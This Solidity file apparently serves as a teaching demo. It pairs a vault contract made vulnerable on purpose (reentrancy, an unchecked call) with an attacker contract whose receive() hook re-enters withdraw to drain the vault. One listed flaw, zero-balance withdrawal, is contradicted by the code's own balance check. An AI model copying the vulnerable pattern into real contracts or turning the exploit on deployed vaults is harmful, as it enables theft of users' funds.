// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

/**
 * @title UnsafeVault
 * @author Gemini
 * @notice This contract is intentionally vulnerable and is for educational purposes only.
 * DO NOT USE THIS IN PRODUCTION.
 * It allows users to deposit and withdraw Ether, but contains several flaws:
 * 1. Reentrancy: `withdraw` sends Ether before updating the user's balance.
 * 2. Integer Underflow: Balance subtractions are not checked (in an `unchecked` block).
 * 3. Unchecked Call: The return value of the low-level `.call` is not checked.
 * 4. Incorrect Access: Anyone can call `withdraw`, even with a zero balance.
 */
contract UnsafeVault {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    // The total accounting of user balances.
    uint256 public totalVaultBalance;

    // Function to deposit Ether into the vault.
    function deposit() public payable {
        require(msg.value > 0, "Deposit must be greater than zero");
        balances[msg.sender] += msg.value;
        totalVaultBalance += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // Function to withdraw Ether from the vault.
    // VULNERABILITY 1: Reentrancy risk. Ether is sent before the balance is updated.
    // VULNERABILITY 2: Unchecked return value of the .call.
    // VULNERABILITY 3: Integer underflow is possible inside the unchecked block.
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // (bool success, ) = msg.sender.call{value: amount}(""); // Unchecked call
        msg.sender.call{value: amount}("");

        unchecked {
            balances[msg.sender] -= amount;
        }
        totalVaultBalance -= amount;

        emit Withdrawal(msg.sender, amount);
    }

    // Helper to check the contract's Ether balance.
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttacker
 * @author Gemini
 * @notice This contract is used to exploit the reentrancy vulnerability in UnsafeVault.
 */
contract ReentrancyAttacker {
    UnsafeVault public vault;
    uint256 public attackAmount;

    constructor(address _vaultAddress) {
        vault = UnsafeVault(_vaultAddress);
    }

    // 1. Fund the attacker contract
    function fund() public payable {
        require(msg.value > 0, "Must send ETH");
    }

    // 2. Attacker deposits funds into the vault, just like a normal user.
    function depositToVault(uint256 amount) public {
        vault.deposit{value: amount}();
        attackAmount = amount;
    }

    // 3. Start the attack.
    function attack() public {
        require(address(vault).balance >= attackAmount, "Vault has no funds to attack");
        vault.withdraw(attackAmount);
    }

    // 4. This function is called when the vault sends Ether.
    // It re-enters the `withdraw` function, draining the contract.
    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }

    // Helper to check the attacker's Ether balance.
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
